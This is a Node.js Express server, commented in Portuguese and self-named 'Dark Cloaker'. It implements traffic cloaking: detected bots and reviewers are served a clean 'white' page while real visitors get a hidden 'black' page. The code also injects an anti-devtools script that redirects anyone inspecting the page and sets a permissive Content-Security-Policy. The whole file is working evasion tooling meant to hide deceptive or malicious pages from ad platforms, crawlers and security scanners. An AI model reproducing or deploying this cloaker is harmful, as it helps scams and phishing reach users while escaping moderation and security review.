require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const path = require("path");

const { isBot } = require("./utils/botDetection");
const Domain = require("./models/Domain");

const app = express();

// 🛡 Segurança
app.use(cors());
app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🗂️ Serve arquivos estáticos das pastas white e black
app.use("/white", express.static(path.join(__dirname, "public", "white")));
app.use("/black", express.static(path.join(__dirname, "public", "black")));

// 🔗 Rotas da API (auth e domínio continuam funcionais)
app.use("/api/auth", require("./routes/auth.routes"));
app.use("/api/domain", require("./routes/domain.routes"));

// 🔌 Conexão Mongo
(async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("🔥 MongoDB conectado");
  } catch (err) {
    console.error("❌ Erro MongoDB:", err.message);
    process.exit(1);
  }
})();

// 🎭 Middleware final de cloaking renderizando HTML local
app.get("*", async (req, res) => {
  try {
    const host = req.hostname;
    const ua = req.headers["user-agent"] || "";
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    // 📦 Busca o domínio no Mongo (opcional — pode tirar se quiser fixar os paths)
    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
    if (!domain) return res.redirect("https://google.com");

    // 👁️ Detecta se é um bot
    const isBotVisit = isBot(ua, ip);

    // 📍 Define o caminho local do HTML a ser servido
    const htmlPath = isBotVisit
      ? path.join(__dirname, "public", "white", "index.html")
      : path.join(__dirname, "public", "black", "index.html");

    // 💣 Anti-devtools: injetado no HTML antes de enviar (opcional)
    const fs = require("fs");
    let html = fs.readFileSync(htmlPath, "utf-8");

    const antiDebugScript = `
      <script>
        function devtoolsDetector() {
          const s = performance.now(); debugger; const e = performance.now();
          if (e - s > 100) location.href = '${domain.fallbackUrl}';
        }
        setInterval(devtoolsDetector, 2000);
      </script>
    `;

    html = html.replace("</body>", `${antiDebugScript}</body>`);

    // 🧬 Cabeçalhos padrão
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Content-Security-Policy", "default-src * data: blob: 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; img-src * data: blob:; font-src * data:");

    return res.send(html);
  } catch (err) {
    console.error("❌ Erro ao renderizar página local:", err.message);
    return res.redirect("https://google.com");
  }
});

// ☠️ Start
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`☠️ Dark Cloaker rodando na porta ${PORT}`);
});
